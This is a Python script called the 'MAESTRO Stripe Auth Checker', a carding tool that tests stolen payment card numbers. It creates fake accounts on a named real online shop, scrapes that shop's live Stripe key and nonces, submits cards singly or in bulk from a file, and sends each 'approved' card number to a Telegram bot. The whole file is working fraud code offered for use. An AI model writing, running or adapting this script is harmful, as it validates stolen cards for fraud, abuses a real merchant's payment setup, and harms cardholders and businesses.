import sys, time, re, random, urllib3, requests, os
from user_agent import *
import telebot

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "Your bot token"
CHAT_ID = "your telegram id"

bot = telebot.TeleBot(BOT_TOKEN)

fgtre = 'https://thepeppermintshop.co.uk'

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def send_telegram(card, result):
    """Send only approved cards to Telegram."""
    if "approved" not in result.lower():
        return
    message = f"🟢 {result}\nCard: <code>{card}</code>"
    try:
        bot.send_message(CHAT_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Telegram error: {e}")

def mnoty(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid format"
    c = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]

    mido = requests.Session()
    uu = generate_user_agent()
    email = f"drt{random.randint(1000,9999)}@gmail.com"

    headers = {
        'authority': 'headwell.org',
        'user-agent': uu,
    }

    Mori = mido.get(f'{fgtre}/my-account/add-payment-method/', headers=headers)
    ft = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', Mori.text).group(1)

    headers = {
        'authority': 'headwell.org',
        'user-agent': uu,
    }

    Skiplow = {
        'email': email,
        'password': 'aaar@123',
        'wc_order_attribution_user_agent': uu,
        'woocommerce-register-nonce': ft,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }

    response = mido.post(f'{fgtre}/my-account/add-payment-method/', headers=headers, data=Skiplow)
    response = mido.get(f'{fgtre}/my-account/add-payment-method/', headers=headers)
    pkk = re.search(r'(pk_live_[a-zA-Z0-9]+)', response.text).group(1)
    VaG = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

    headers = {
        'authority': 'api.stripe.com',
        'user-agent': uu,
    }
    data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={pkk}'
    response = mido.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    idf = response.json()['id']

    headers = {
        'authority': fgtre,
        'user-agent': uu,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idf,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': VaG,
    }
    r5 = mido.post(f'{fgtre}/wp-admin/admin-ajax.php', headers=headers, data=data).text

    if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
        return 'Your card was declined'
    elif 'success' in r5 or 'Success' in r5:
        return "Approved"
    elif 'funds' in r5 or 'Insufficient' in r5:
        return "Approved - Insufficient"
    elif '"success":true,"data":{"status":"requires_action"' in response.text:
        return "Approved Otp"
    elif 'Your card number is incorrect.' in r5:
        return 'CVC Error'
    else:
        try:
            return r5.json()['data']['error']['message']
        except:
            return r5

def print_result(card, result):
    """Print colored result and send to Telegram if Approved."""
    if "approved" in result.lower():
        print(f"{GREEN}{card} ➤➤ {result} ✓{RESET}")
    else:
        print(f"{RED}{card} ➤➤ {result}{RESET}")
    send_telegram(card, result)

def single_check():
    card = input("Enter card (format: c|mm|yy|cvc): ").strip()
    if not card:
        print("No input.")
        return
    result = mnoty(card)
    print_result(card, result)

def file_check():
    path = input("Enter file path: ").strip()
    if not os.path.isfile(path):
        print("File not found.")
        return
    with open(path, 'r') as f:
        cards = f.readlines()
    total = len(cards)
    for i, card in enumerate(cards, 1):
        card = card.strip()
        if not card:
            continue
        print(f"[{i}/{total}]", end=" ")
        result = mnoty(card)
        print_result(card, result)

def main():
    print("Welcome to MAESTRO Stripe Auth Checker")
    while True:
        print("\nMenu:")
        print("1. Check Single Card")
        print("2. Check Cards from File")
        print("3. Exit")
        choice = input("Choose: ").strip()
        if choice == '1':
            single_check()
        elif choice == '2':
            file_check()
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice, try again.")

if __name__ == "__main__":
    main()